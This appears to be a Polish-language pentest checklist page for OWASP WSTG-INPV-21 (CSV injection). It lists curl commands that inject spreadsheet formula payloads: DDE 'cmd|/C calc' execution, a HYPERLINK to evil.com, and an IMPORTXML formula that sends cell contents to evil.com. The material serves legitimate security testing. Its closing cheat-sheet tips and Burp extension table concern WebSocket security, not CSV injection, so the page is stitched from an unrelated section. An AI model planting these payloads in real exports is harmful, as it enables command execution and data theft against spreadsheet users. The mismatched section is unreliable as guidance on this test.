# WSTG-INPV-21 — Testing for CSV Injection

## Cele

- Identify CSV/spreadsheet export features that include untrusted input
- Verify whether attacker-controlled values are interpreted as formulas

## KOMENDY

### Wstrzykiwanie formul do pol eksportowanych do CSV

```bash
curl -X POST "https://TARGET/data" -d "name==cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name=+cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name=-cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name=@SUM(1+1)*cmd|'/C calc'!A0"
curl -X POST "https://TARGET/data" -d "name==HYPERLINK(\"http://evil.com\",\"Click\")"
curl -X POST "https://TARGET/data" -d "name==IMPORTXML(CONCAT(\"http://evil.com/\",CONCATENATE(A2:E2)),\"//a\")"

```

### Pobranie wyeksportowanego CSV i sprawdzenie

```bash
curl -s "https://TARGET/export/csv" -o export.csv
cat export.csv | grep -E "^[=+\-@]"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings CSV Injection

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/CSV Injection/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj funkcje eksportu CSV/XLSX
2. Wstaw payloady formul (=, +, -, @) w pola ktore beda eksportowane
3. Pobierz wyeksportowany plik i otworz w Excel
4. Sprawdz czy formuly sa wykonywane
5. Testuj HYPERLINK i IMPORTXML do exfiltracji danych
6. Sprawdz czy aplikacja sanityzuje dane przed eksportem


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — WebSocket_Security_Cheat_Sheet.md

- Waliduj naglowek Origin przy handshake — zapobiegaj cross-site WebSocket hijacking
- Uzywaj WSS (WebSocket Secure) zamiast WS — szyfruj ruch
- Uwierzytelniaj polaczenia WebSocket — nie zakladaj ze handshake = autoryzacja
- Waliduj WSZYSTKIE wiadomosci po stronie serwera — WebSocket to dwukierunkowy kanal
- Implementuj rate limiting na wiadomosci WebSocket

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SocketSleuth | Zaawansowane testowanie bezpieczenstwa WebSocket | [GitHub](https://github.com/snyk/socketsleuth) |
| WebSocket Turbo Intruder | Fuzzowanie wiadomosci WebSocket z custom kodem | [GitHub](https://github.com/Hannah-PortSwigger/WebSocketTurboIntruder) |
